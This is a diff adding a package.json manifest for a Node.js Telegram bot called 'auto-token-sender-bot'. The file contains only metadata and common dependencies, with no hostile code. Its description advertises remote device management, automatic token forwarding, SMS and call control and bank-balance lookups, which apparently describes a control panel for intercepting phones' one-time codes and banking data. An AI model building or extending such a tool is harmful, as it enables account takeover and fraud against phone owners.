@@ -1,0 +1,18 @@
+{
+  "name": "auto-token-sender-bot",
+  "version": "7.1.0",
+  "description": "Auto Token Sender — Telegram bot: Firebase device manager, auto token forwarding, SMS/call control, all-India bank balance. Vercel webhook + VPS modes.",
+  "main": "api/bot.js",
+  "scripts": {
+    "start": "node api/bot.js",
+    "test": "node test.js && node smoke.js"
+  },
+  "engines": {
+    "node": ">=18"
+  },
+  "dependencies": {
+    "axios": "^1.6.0",
+    "dotenv": "^16.3.1",
+    "express": "^4.18.2"
+  }
+}
